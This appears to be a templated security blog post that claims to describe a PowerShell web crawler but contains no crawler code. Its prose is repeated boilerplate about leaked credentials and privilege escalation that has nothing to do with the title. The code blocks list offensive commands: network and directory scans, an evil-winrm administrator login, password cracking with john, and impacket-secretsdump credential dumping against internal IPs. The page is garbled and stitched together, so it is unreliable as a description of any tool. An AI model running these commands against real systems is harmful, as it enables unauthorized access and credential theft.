---
TitleSEO: "Web Crawler and Spider in PowerShell | ZureFX"
TitlePost: "Web Crawler and Spider — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for web crawler and spider. Built for security research and automation."
Keywords: "powershell, fuzzer, script, rust, go"
URL: "https://zurefx.github.io/scripting/script-web-crawler-and-spider-715.html"
URL_IMAGES: ""
Date: "2026-03-20"
Tags: "PowerShell, Fuzzer, Script, Rust, Go"
Section: "scripting"
Lang: "en"
main_img: "script-web-crawler-and-spider-715"
Permalink: "/scripting/script-web-crawler-and-spider-715.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality. Group Policy Preferences contained encrypted but recoverable credentials.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `GetNPUsers`
- `feroxbuster`
- `netcat`

## Implementation

### Core Logic

The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
nmap -sCV -p3389,464,587 10.47.21.127 -oN scan.txt
gobuster dir -u http://10.16.76.175/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.16.117.21 -u administrator -p 'P@ssw0rd!'
```

Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

### Helper Functions

Lateral movement was facilitated by reusing discovered credentials across services. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
nmap -sCV -p3389,135,464 10.66.97.34 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.67.155.106/FUZZ
gobuster dir -u http://10.97.58.227/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

The service account had excessive permissions assigned in Active Directory. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p8888,9200,389 10.63.47.132 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.114.245.24/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.99.6.241
```

### Advanced Options

The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file. The application stored sensitive credentials in an unencrypted configuration file.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.67.161.22
```

## Output

### Example Output

The kernel version was outdated and vulnerable to a publicly known exploit. Authentication bypass was achieved through careful manipulation of the login mechanism.

```
[+] Scanning target...
[+] Found 19 results
[+] Done in 28.09s
```
